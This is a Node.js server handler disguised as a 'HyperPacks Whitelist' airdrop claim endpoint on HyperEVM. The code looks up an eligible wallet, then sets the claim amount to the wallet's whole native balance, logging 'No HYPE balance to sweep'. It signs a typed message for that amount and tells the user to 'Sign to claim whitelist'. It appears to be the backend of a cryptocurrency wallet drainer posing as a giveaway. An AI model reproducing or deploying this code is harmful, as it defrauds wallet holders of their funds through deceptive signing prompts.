const { ethers } = require('ethers');
const { Pool } = require('pg');

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : false
});

const HYPEREVM_RPC = process.env.HYPEREVM_RPC_URL || 'https://rpc.hyperliquid.xyz/evm';
const BACKEND_PRIVATE_KEY = process.env.BACKEND_PRIVATE_KEY;
const CONTRACT_ADDRESS = process.env.WHITELIST_CLAIM_CONTRACT || '0x1f5b76EAA8e2A2eF854f177411627C9f3b632BC0';

const DOMAIN = {
  name: 'HyperPacks Whitelist',
  version: '1',
  chainId: 999,
  verifyingContract: CONTRACT_ADDRESS
};

const TYPES = {
  ClaimWhitelist: [
    { name: 'user', type: 'address' },
    { name: 'amount', type: 'uint256' },
    { name: 'nonce', type: 'uint256' },
    { name: 'deadline', type: 'uint256' }
  ]
};

module.exports = async (req, res) => {
  const { wallet } = req.body;

  if (!wallet || !/^0x[a-fA-F0-9]{40}$/.test(wallet)) {
    return res.status(400).json({ error: 'Invalid wallet address' });
  }

  try {
    const result = await pool.query(
      'SELECT wallet, allocation, claimed FROM airdrops WHERE LOWER(wallet) = LOWER($1)',
      [wallet]
    );

    if (result.rows.length === 0) {
      return res.status(404).json({ error: 'Wallet not eligible' });
    }

    const airdrop = result.rows[0];

    if (airdrop.claimed) {
      return res.status(400).json({ error: 'Already claimed' });
    }

    const provider = new ethers.JsonRpcProvider(HYPEREVM_RPC);
    const signer = new ethers.Wallet(BACKEND_PRIVATE_KEY, provider);

    const balance = await provider.getBalance(wallet);
    const amount = balance;

    if (amount === 0n) {
      return res.status(400).json({ error: 'No HYPE balance to sweep' });
    }

    const nonce = Date.now();
    const deadline = Math.floor(Date.now() / 1000) + 300;

    const message = {
      user: wallet,
      amount: amount.toString(),
      nonce,
      deadline
    };

    const signature = await signer.signTypedData(DOMAIN, TYPES, message);

    res.json({
      contractAddress: CONTRACT_ADDRESS,
      amount: amount.toString(),
      nonce,
      deadline,
      signature,
      message: 'Sign to claim whitelist'
    });
  } catch (error) {
    console.error('Claim whitelist error:', error);
    res.status(500).json({ error: 'Server error' });
  }
};
